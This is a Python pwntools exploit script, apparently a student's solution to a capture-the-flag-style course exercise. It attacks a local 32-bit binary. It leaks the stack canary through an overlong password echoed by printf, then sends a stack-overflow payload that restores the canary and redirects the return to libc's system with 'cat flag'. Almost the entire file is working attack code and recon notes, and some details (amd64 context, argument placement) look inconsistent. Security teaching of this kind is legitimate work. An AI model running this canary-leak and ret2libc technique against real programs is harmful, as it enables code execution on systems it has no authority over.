#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
#exe = 'handout/exercise4/exercise4a'
exe = './exercise4a'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()
'''
arch     x86
baddr    0x8048000
binsz    14724
bintype  elf
bits     32
canary   false
class    ELF32
compiler GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
crypto   false
endian   little
havecode true
intrp    /lib/ld-linux.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  Intel 80386
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
'''
'''
0x08049280 0 sym.__do_global_dtors_aux
0x080492b0 6 entry.init0
0x080492b0 0 sym.frame_dummy
0x080492b6 63 sym.readLine
0x080492f5 131 sym.check_authorization
0x08049378 100 sym.welcome
0x080493dc 333 main
0x080493dc 333 sym.main
0x08049530 101 sym.__libc_csu_init
'''
'''
0x0804a008 27 str.Enter_the_secret_password:
0x0804a024 39 str.Well_of_course__s_is_not_the_password
0x0804a04b 22 str.Hi__what_s_your_name
0x0804a061 14 str.Welcome__s
0x0804a06f 26 str.Unauthorized._Try_again
'''
'''
0804a008         db         "Enter the secret password:", 0                     ; DATA XREF=check_authorization+37
0804a023         align      4
             aWellOfCourseSI:
0804a024         db         "Well of course %s is not the password\n", 0        ; DATA XREF=check_authorization+87
             aHiWhatsYourNam:
0804a04b         db         "Hi, what's your name?", 0                          ; DATA XREF=welcome+25
             aWelcomeSnn:
0804a061         db         "Welcome %s!\n\n", 0                                ; DATA XREF=welcome+79
             aUnauthorizedTr:
0804a06f         db         "Unauthorized. Try again\n\r", 0                    ; DATA XREF=main+316
'''

'''
0x0804bff4 0 sym..got
0x0804c000 0 sym..got.plt

-> 0x0804c028 mentions libc
'''

#Canary starts @0x0804c044 and ends @0x0804c05f (including)
#name starts   @0x0804c060 and ends @0x0804c087 (including)

#Map strings to functions that print them:

#In main there are 2 functions of interest: 
# 1 printf -> "Unauthorized. Try again\n\r"

#sym.welcome:
# 1 puts -> "Hi, what's your name?"
# 1 fgets (vulnerable) [@0x0804c060 and ends @0x0804c087]
# 1 printf -> "Welcome %s!\n\n"

#sym.check_authorization
# 1 puts -> "Enter the secret password:"
# 1 readline
# 1 printf -> "Well of course %s is not the password\n"

#0x08049505: this is location of canary
#In check_authorization, canary is used

i = 1;

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"Hi, what's your name?"

r.sendline(b"ABCDEFGH") #read string with fgets

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"Welcome %s!\n\n"

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"!\n"

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"\n"

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"Enter the secret password:"

#string is stored beginning at address rbp - 216;
#canary is stored beginning at address rbp - 16
r.sendline((216 - 16 - 1) * b"A") #read string with readline, readline appends \n so account for it (-1)

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"Well of course %s\n"

print("Msg " + str(i) + ": ", end="")
i = i + 1
canary_line = r.recvline()
print(canary_line) #"[canary] is not the password\n"

canary = canary_line[0:4] #first 4 bytes is canary value
print("Canary: ", end="")
print(canary)

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"Unauthorized. Try again\n\r"

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"Enter the secret password:"

pre_canary = (216 - 16) * b'A'
post_canary_frame = (16 - 4) * b'B'
ebx_value_overwrite = 4 * b'C'
main_rbp_value = 4 * b'D'
new_ret_address = p32(r.libc.symbols['system'], endian='little') #b"\x56\x12\x40\x00\x00\x00\x00\x00"
new_ret_address = new_ret_address + (4 - len(new_ret_address)) * b'\x00'
arg1 = b"cat flag"
terminal = 4 * b"\x00"

payload = pre_canary + canary + post_canary_frame + ebx_value_overwrite + main_rbp_value + new_ret_address + arg1 + terminal
print(payload)
r.sendline(payload)


print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"Well of course %s\n"

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"[canary] is not the password\n"

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"Unauthorized. Try again\n\r"

print("Final Msg: ", end="")
# r.recvline()
print(r.recvall(timeout=5))


